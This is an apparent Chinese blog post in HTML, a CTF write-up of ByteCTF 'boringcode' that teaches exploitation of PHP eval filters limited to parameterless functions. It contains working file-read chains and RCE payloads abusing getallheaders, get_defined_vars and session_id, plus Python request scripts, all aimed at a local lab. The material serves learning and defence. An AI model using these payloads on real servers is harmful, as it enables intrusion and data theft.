@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="Chinese">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
+  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.3.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copiar',
+      copy_success: 'Copiado',
+      copy_failure: 'Copiar falló'
+    }
+  };
+</script>
+
+  <meta name="description" content="说在前面这次参与了ByteCTF，尝试做了boringcode和EZCMS。虽然都没做出来，但是学到了很多东西。 这次通过ALTM4NZ师傅的wp来分析一下boringcode这道题并学习一下无参数函数的利用。 boringcode看一下代码： 123456789101112131415161718192021222324252627282930313233&amp;lt;?phpfunction is_">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ByteCTF一道题的分析与学习PHP无参数函数的利用">
+<meta property="og:url" content="http://yoursite.com/2019/09/15/boringcode/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="说在前面这次参与了ByteCTF，尝试做了boringcode和EZCMS。虽然都没做出来，但是学到了很多东西。 这次通过ALTM4NZ师傅的wp来分析一下boringcode这道题并学习一下无参数函数的利用。 boringcode看一下代码： 123456789101112131415161718192021222324252627282930313233&amp;lt;?phpfunction is_">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/jOkhe2V7z8w4U6G.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/JhI3Ny8GPdl9Z7L.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/gGmqzhT8APHunaN.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/MYdEGq9et7SRUsX.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/L76jp2Dg4aCJKVu.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/xNwWGcYXgTE4B5y.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/RerdnaO2omz4xZG.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/TqKNil54MIWwd2v.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/JT8QBimcpEboLZD.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/J3pxUcHf8mPziXl.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/7j13wV54ZIsXxfr.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/QZLUjoBDmVIGw6a.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/gUfjpJoySZiwHMh.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/09/15/tARoWnCeYXZDVKb.jpg">
+<meta property="og:updated_time" content="2019-09-15T09:12:08.473Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ByteCTF一道题的分析与学习PHP无参数函数的利用">
+<meta name="twitter:description" content="说在前面这次参与了ByteCTF，尝试做了boringcode和EZCMS。虽然都没做出来，但是学到了很多东西。 这次通过ALTM4NZ师傅的wp来分析一下boringcode这道题并学习一下无参数函数的利用。 boringcode看一下代码： 123456789101112131415161718192021222324252627282930313233&amp;lt;?phpfunction is_">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/15/jOkhe2V7z8w4U6G.jpg">
+  <link rel="canonical" href="http://yoursite.com/2019/09/15/boringcode/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>ByteCTF一道题的分析与学习PHP无参数函数的利用 | Threezh1's blog</title>
+  <meta name="generator" content="Hexo 3.8.0">
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Threezh1's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">分享学习、分享想法</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Cambiar a barra de navegación">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Inicio</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archivo</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-threeday">
+      
+    
+
+    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content page-post-detail">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/15/boringcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">ByteCTF一道题的分析与学习PHP无参数函数的利用
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Publicado el</span>
+
+              
+                
+              
+
+              <time title="Creado por: 2019-09-15 17:12:31 / Modificado por: 17:12:08" itemprop="dateCreated datePublished" datetime="2019-09-15T17:12:31+08:00">2019-09-15</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">En</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>这次参与了ByteCTF，尝试做了boringcode和EZCMS。虽然都没做出来，但是学到了很多东西。</p>
+<p>这次通过ALTM4NZ师傅的wp来分析一下boringcode这道题并学习一下无参数函数的利用。</p>
+<h2 id="boringcode"><a href="#boringcode" class="headerlink" title="boringcode"></a>boringcode</h2><p>看一下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个页面的作用是，接受一个url参数，利用file_get_content远程获取url页面的源码，传递给eval执行。但在url传递和源码传递过程中有各种检测。</p>
+<h3 id="第一个点："><a href="#第一个点：" class="headerlink" title="第一个点："></a>第一个点：</h3><ol>
+<li>is_valid_url()函数来检测url的正确性，并禁止使用data协议。</li>
+<li>url的host必须以baidu.com结尾。</li>
+</ol>
+<p>绕过：</p>
+<p>如果data协议没有被绕过，则可以使用：<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code> 来进行绕过。</p>
+<p>这里把data协议禁止了之后，想要利用伪协议绕过的话近乎无解。只想到购买域名来进行绕过，比如threezh1baidu.com。 (还好没买! 买了也做不出来。)</p>
+<h3 id="第二个点："><a href="#第二个点：" class="headerlink" title="第二个点："></a>第二个点：</h3><ol>
+<li>由<code>preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;</code>可知，这里只允许无参数的函数传递进来。并且函数名只能为字母，不能包含下划线等其他特殊字符。</li>
+<li>过滤了很多的关键字：<code>et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log</code></li>
+</ol>
+<p>这里绕过没做出来，学习大佬是怎么做这题的。</p>
+<p>绕过：</p>
+<p><code>preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;</code>虽然只允许无参数，但是允许函数套用。正则表达式匹配情况：</p>
+<p><img src="https://i.loli.net/2019/09/15/jOkhe2V7z8w4U6G.jpg" alt="zhengze01.jpg"></p>
+<p><img src="https://i.loli.net/2019/09/15/JhI3Ny8GPdl9Z7L.jpg" alt="zhengze02.jpg"></p>
+<p><img src="https://i.loli.net/2019/09/15/gGmqzhT8APHunaN.jpg" alt="zhengze03.jpg"></p>
+<p>通过这样的嵌套，就能构造出payload进行读取文件操作，在特殊情况下还可以进行RCE。这题只能读取文件。</p>
+<ul>
+<li><strong>第一种方式：</strong></li>
+</ul>
+<p>参考：<a href="http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/" target="_blank" rel="noopener">ByteCTF_WEB</a></p>
+<p>来看这个师傅的Payload：</p>
+<p><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></p>
+<p>payload很长，第一次看的的时候吓了一跳。 来看看他是怎么通过这个payload获取到flag了吧。</p>
+<p>因为环境已经关了，所以我在在本地搭了一个环境。 </p>
+<p>WWW/flag  flag文件</p>
+<p>WWW/code/code.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'code'</span>])&#123;</span><br><span class="line">	$code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">	        <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	        <span class="keyword">eval</span>($code);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"No No No"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>先来看这几个函数：</p>
+<pre><code>scandir()    列出 images 目录中的文件和目录。
+end()        将内部指针指向数组中的最后一个元素，并输出。
+readfile()  输出一个文件
+</code></pre><p>scandir()接受一个目录地址的参数，当传递为一个”.”时，则会返回一个数组包含当前目录下的目录名和文件名。</p>
+<p>那构造<code>readfile(end(scandir(&#39;.&#39;)));</code>就会读取到当前目录下最后一个文件。</p>
+<p>如果把函数参数检测关掉的话，返回的内容为code.php的源码：</p>
+<p><img src="https://i.loli.net/2019/09/15/MYdEGq9et7SRUsX.jpg" alt="yuanma01.jpg"></p>
+<p>这题因为不能附带参数，所以需要寻找一个函数能生成一个”.”。于是找到了</p>
+<pre><code>localeconv()   函数返回一包含本地数字及货币格式信息的数组。
+</code></pre><p>这个函数会返回：</p>
+<pre><code>array(18) {
+  [&quot;decimal_point&quot;]=&gt;
+  string(1) &quot;.&quot;
+  [&quot;thousands_sep&quot;]=&gt;
+  string(0) &quot;&quot;
+  [&quot;int_curr_symbol&quot;]=&gt;
+  ....
+</code></pre><p>数组中第一个值就是”.”。再通过下面两个函数可以构造:<code>current(localeconv())</code>或者<code>pos(localeconv())</code>。因为这里还过滤en，所以就选择了后者。</p>
+<pre><code>current()        返回数组中的当前单元, 默认取第一个值
+pos()            current() 的别名 
+</code></pre><p>这时，我们就可以获取到当前目录的最后一个文件了,payload为：</p>
+<p><code>readfile(end(scandir(pos(localeconv()))));</code></p>
+<p>因为flag是在上一个目录，所以我们还需要使用<code>chdir()</code> <code>next()</code>来重新定义一下php当前目录，再使用readfile进行读取文件。</p>
+<pre><code>chdir() 函数改变当前的目录。
+next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;
+</code></pre><p>将目录定义为上一目录：<code>chdir(next(scandir(pos(localeconv()))))</code></p>
+<p>但是chdir()函数执行成功之后不会返回当前目录，只会返回”1”。 如前面读文件一样，我们还是需要一个”.”来读取flag。</p>
+<p>ALTM4NZ师傅找到了一个很骚的操作，就是使用<code>localtime()</code>配合<code>chr</code>来获取一个”.”。</p>
+<pre><code>localtime() 函数返回本地时间。返回的类型为关联数组
+
+    关联数组的键名如下：
+
+    [tm_sec] - 秒数
+    [tm_min] - 分钟数
+    [tm_hour] - 小时
+    ...
+
+chr() 函数从指定的 ASCII 值返回字符。
+</code></pre><p>获取”.”的payload：<code>chr(pos(localtime()))</code></p>
+<p>当时间为某一分钟的46秒时, pos(localtime())返回46。46是”.”的ASCII码值。所以payload就会返回”.”</p>
+<p>但这里存在一个问题就是localtime()参数只接受时间戳。</p>
+<p><img src="https://i.loli.net/2019/09/15/L76jp2Dg4aCJKVu.jpg" alt="localtime.jpg"></p>
+<p>所以这里需要使用time()来解决。time()不会受参数的影响并且会返回一个时间戳。</p>
+<p>至此，我们的payload就为：</p>
+<p><code>chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))</code></p>
+<p>在46秒的时候，就会返回”.”</p>
+<p><img src="https://i.loli.net/2019/09/15/xNwWGcYXgTE4B5y.jpg" alt="dian.jpg"></p>
+<p>再用前面读取文件的方式就可以在每分钟的46秒时读取到flag了。</p>
+<p><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></p>
+<p><img src="https://i.loli.net/2019/09/15/RerdnaO2omz4xZG.jpg" alt="getflag.jpg"></p>
+<ul>
+<li><strong>第二种方式</strong></li>
+</ul>
+<p>这个payload是在群里面看到一个师傅发的。</p>
+<p><code>if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</code></p>
+<p>因为chdir()返回0和1，所以使用if来判断并执行后面语句进行读取文件。这样就不用使用localtime函数来获取”.”。可以直接读flag。</p>
+<p><img src="https://i.loli.net/2019/09/15/TqKNil54MIWwd2v.jpg" alt="getflag1.jpg"></p>
+<p>实现的函数在第一种方式都有。就不分析了。</p>
+<h2 id="无参数函数的利用总结"><a href="#无参数函数的利用总结" class="headerlink" title="无参数函数的利用总结"></a>无参数函数的利用总结</h2><p>环境：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_POST[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里正则表达式和题目的区别在于这里还运行函数名称包含<code>_</code>等特殊字符。</p>
+<h3 id="获取环境变量"><a href="#获取环境变量" class="headerlink" title="获取环境变量"></a>获取环境变量</h3><p>使用getenv()获取超全局变量的数组，使用array_rand和array_flip爆破出所有的全局变量。</p>
+<pre><code>getenv()         获取一个环境变量的值(在7.1之后可以不给予参数)
+array_rand()     函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+</code></pre><p>payload:</p>
+<p><code>echo(array_rand(array_flip(getenv())));</code></p>
+<p><img src="https://i.loli.net/2019/09/15/JT8QBimcpEboLZD.jpg" alt="payload1.jpg"></p>
+<h3 id="getallheaders-gt-RCE"><a href="#getallheaders-gt-RCE" class="headerlink" title="getallheaders() =&gt; RCE"></a>getallheaders() =&gt; RCE</h3><pre><code>getallheaders()        获取全部 HTTP 请求头信息, 是下方函数的别名
+apache_request_headers    获取全部 HTTP 请求头信息
+这两个函数只适用于apache服务器
+</code></pre><p>函数返回内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">array(11) &#123;</span><br><span class="line">  [&quot;Accept-Language&quot;]=&gt;</span><br><span class="line">  string(23) &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span><br><span class="line">  [&quot;Accept-Encoding&quot;]=&gt;</span><br><span class="line">  string(17) &quot;gzip, deflate, br&quot;</span><br><span class="line">  [&quot;Accept&quot;]=&gt;</span><br><span class="line">  string(3) &quot;*/*&quot;</span><br><span class="line">  [&quot;Content-Type&quot;]=&gt;</span><br><span class="line">  string(68) &quot;multipart/form-data; boundary=----WebKitFormBoundaryevLOjNPCJPGbsCBf&quot;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当我们构造一个Header时：</p>
+<p><img src="https://i.loli.net/2019/09/15/J3pxUcHf8mPziXl.jpg" alt="header1.jpg"></p>
+<p>添加一个Header为<code>test: phpinfo();</code>,根据位置选择合适的payload：</p>
+<ol>
+<li><p>添加在Header在第一个：</p>
+<p> payload: <code>code=eval(pos(getallheaders()));</code> </p>
+<p> (pos()可以换为current(). 如果在第二个可以使用next())</p>
+</li>
+<li><p>添加在Header在最后一个：</p>
+<p> payload: <code>code=eval(end(getallheaders()));</code></p>
+</li>
+<li><p>不知道位置：</p>
+<p> 配合<code>array_rand()</code>, <code>array_flip()</code>构造payload进行爆破：</p>
+<p> payload: <code>eval(array_rand(array_flip(getallheaders())));</code></p>
+</li>
+</ol>
+<p><img src="https://i.loli.net/2019/09/15/7j13wV54ZIsXxfr.jpg" alt="suijibaopo.jpg"></p>
+<h3 id="get-defined-vars-gt-RCE"><a href="#get-defined-vars-gt-RCE" class="headerlink" title="get_defined_vars() =&gt; RCE"></a>get_defined_vars() =&gt; RCE</h3><pre><code>get_defined_vars() 函数返回由所有已定义变量所组成的数组。
+</code></pre><p>和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用</p>
+<p>函数返回内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;_GET&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_POST&quot;]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;code&quot;]=&gt;</span><br><span class="line">    string(29) &quot;var_dump(get_defined_vars());&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_COOKIE&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_FILES&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会返回全局变量的值，如get、post、cookie、file数据。</p>
+<ol>
+<li>利用<code>$_GET</code></li>
+</ol>
+<p>url中添加参数：<a href="http://127.0.0.1/code/code.php?test=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/code/code.php?test=phpinfo()</a>;</p>
+<p>post数据：<code>eval(end(current(get_defined_vars())));</code></p>
+<p><img src="https://i.loli.net/2019/09/15/QZLUjoBDmVIGw6a.jpg" alt="getphpinfo.jpg"></p>
+<ol start="2">
+<li>利用<code>$_FILES</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"system('ping 127.0.0.1');"</span>: <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"code"</span>:<span class="string">"eval(pos(pos(end(get_defined_vars()))));"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/code/code.php'</span>, data=data, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
+<p>把payload直接放在文件的名称上，再通过两个pos定位进行利用。</p>
+<p>也可以像sky师傅脚本里面那样进行编码，使用hex2bin()解码利用。</p>
+<p><img src="https://i.loli.net/2019/09/15/gUfjpJoySZiwHMh.jpg" alt="filephpinfo.jpg"></p>
+<h3 id="session-id-gt-RCE"><a href="#session-id-gt-RCE" class="headerlink" title="session_id() =&gt; RCE"></a>session_id() =&gt; RCE</h3><pre><code>session_id() 可以用来获取/设置 当前会话 ID。
+</code></pre><p>可以通过修改cookie来设置session，用<code>session_id()</code>读取进行利用。</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('ping 127.0.0.1');"</span></span><br><span class="line">payload = str(binascii.b2a_hex(payload.encode(<span class="string">'utf-8'</span>))).strip(<span class="string">"b"</span>).strip(<span class="string">"'"</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">"PHPSESSID"</span>: payload</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"code"</span>:<span class="string">"eval(hex2bin(session_id(session_start())));"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/code/code.php'</span>, data=data, cookies=cookies)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/09/15/tARoWnCeYXZDVKb.jpg" alt="session.jpg"></p>
+<h3 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h3><p>这里是针对无参数函数利用来说的。</p>
+<pre><code>getchwd() 函数返回当前工作目录。
